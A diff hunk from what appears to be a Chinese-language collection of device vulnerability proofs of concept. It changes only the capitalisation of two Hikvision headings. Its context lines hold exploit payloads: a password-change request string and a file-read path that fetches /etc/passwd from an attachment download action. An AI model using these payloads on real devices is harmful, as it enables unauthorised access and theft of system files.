@@ -773,7 +773,7 @@ uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
 
 ### 0x01 网络摄像机
 
-#### HIKVISION DS/IDS/IPC 等设备
+#### Hikvision DS/IDS/IPC 等设备
 
 FOFA：
 
@@ -825,7 +825,7 @@ poc：
 /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
 ```
 
-#### HIKVISION iVMS-8700综合安防管理平台
+#### Hikvision iVMS-8700综合安防管理平台
 
 FOFA：
 
